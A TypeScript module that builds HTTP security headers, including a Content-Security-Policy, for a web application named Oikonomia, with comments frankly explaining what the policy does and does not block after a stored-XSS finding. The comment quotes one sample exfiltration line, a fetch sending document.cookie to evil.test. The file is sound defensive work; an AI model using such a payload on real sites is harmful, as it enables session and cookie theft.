import { deploymentIsHttps } from "../auth/site-url";
import { currentInstallation } from "../installation/policy";

/**
 * The headers a browser is told to enforce.
 *
 * ## Why these exist
 *
 * The release audit found stored cross-site scripting in note blocks. That is
 * fixed at the renderer and at the server contract, and this is the layer that
 * assumes one day it will be wrong again: a policy the browser enforces does
 * not depend on the application getting sanitizing right.
 *
 * ## What the policy here can and cannot do
 *
 * Stated precisely, because a Content-Security-Policy that is described as
 * stronger than it is becomes a reason not to look at the real defences.
 *
 * TanStack Start streams an inline `<script>` carrying the route manifest, and
 * its contents differ per request — so it cannot be allowed by hash, and
 * allowing it needs `'unsafe-inline'`. That keyword also permits inline event
 * handlers, so **this policy would not have stopped the `onerror` in that XSS
 * from running**.
 *
 * What it does stop is the half that makes such a bug worth exploiting:
 *
 * - `connect-src 'self'` — the payload's `fetch('https://evil.test/?c=' +
 *   document.cookie)` is refused. Script that cannot talk to an attacker's
 *   server cannot exfiltrate what it reads.
 * - `script-src 'self'` — no loading a larger payload from another origin.
 * - `object-src 'none'`, `frame-src 'none'` — no plugin or frame smuggling.
 * - `base-uri 'self'` — no rewriting where relative URLs resolve.
 * - `form-action 'self'` — no posting a form somewhere else.
 * - `frame-ancestors 'none'` — Oikonomia cannot be framed, so it cannot be
 *   clickjacked.
 *
 * Moving to a nonce would remove the `'unsafe-inline'` caveat, and needs the
 * nonce threaded into the streamed script tag. It is recorded as follow-up
 * work rather than claimed here.
 *
 * ## Why not in development
 *
 * Vite's dev server needs `eval` and a websocket back to itself. A policy that
 * has to be loosened until it permits those is not the policy production runs,
 * and pretending otherwise tests nothing.
 */

const POLICY: Record<string, string> = {
  "default-src": "'self'",
  "base-uri": "'self'",
  "object-src": "'none'",
  "frame-src": "'none'",
  "frame-ancestors": "'none'",
  "form-action": "'self'",
  "img-src": "'self' data: blob:",
  "font-src": "'self' https://fonts.gstatic.com",
  "style-src": "'self' 'unsafe-inline' https://fonts.googleapis.com",
  "script-src": "'self' 'unsafe-inline'",
  "connect-src": "'self'",
  "worker-src": "'self' blob:",
};

export function contentSecurityPolicy(https: boolean): string {
  const directives = Object.entries(POLICY).map(([name, value]) => `${name} ${value}`);

  /* Only over HTTPS. On plain http it would upgrade every request to a scheme
     the server is not listening on, which is a broken site rather than a
     secure one. */
  if (https) directives.push("upgrade-insecure-requests");

  return directives.join("; ");
}

/**
 * Every header, for a given deployment.
 *
 * Separated from applying them so the set can be asserted directly, and so the
 * HTTPS-only ones can be tested both ways without a server.
 */
export function securityHeaders(options: {
  https: boolean;
  development: boolean;
  /** A public demonstration, whose invented records must not be indexed as a real church's. */
  noindex?: boolean;
}): Record<string, string> {
  const headers: Record<string, string> = {
    "X-Content-Type-Options": "nosniff",
    /* Superseded by `frame-ancestors` in browsers that read CSP, and still the
       only thing older ones understand. */
    "X-Frame-Options": "DENY",
    "Referrer-Policy": "strict-origin-when-cross-origin",
    /* Oikonomia asks for none of these. Saying so stops anything embedded
       from asking on its behalf. */
    "Permissions-Policy": "camera=(), microphone=(), geolocation=(), payment=()",
  };

  if (!options.development) {
    headers["Content-Security-Policy"] = contentSecurityPolicy(options.https);
  }

  if (options.https) {
    /* Two years, subdomains included. Not preloaded: preloading is a decision
       a church makes about its own domain and is painful to undo. */
    headers["Strict-Transport-Security"] = "max-age=63072000; includeSubDomains";
  }

  if (options.noindex) {
    /* A header rather than robots.txt or a meta tag: the same build serves a
       church's own installation, which must stay findable, and a header is
       decided per installation at runtime. It also covers what a meta tag
       cannot — /healthz, error pages, anything that is not a page. */
    headers["X-Robots-Tag"] = "noindex, nofollow";
  }

  return headers;
}

/**
 * Whether this installation asks not to be indexed: a public demonstration.
 *
 * An installation whose policy cannot be read is answered as if it were one —
 * it serves only an error page, and asking a search engine to skip that costs
 * nothing.
 */
function noindex(): boolean {
  try {
    return currentInstallation().demoMode;
  } catch {
    return true;
  }
}

/**
 * Add them to a response without disturbing what is already there.
 *
 * A header the application set deliberately wins — `Set-Cookie` above all,
 * which must never be replaced by a blanket pass.
 */
export function withSecurityHeaders(response: Response): Response {
  const headers = securityHeaders({
    https: deploymentIsHttps(),
    development: process.env["NODE_ENV"] !== "production",
    noindex: noindex(),
  });

  for (const [name, value] of Object.entries(headers)) {
    if (!response.headers.has(name)) response.headers.set(name, value);
  }
  return response;
}
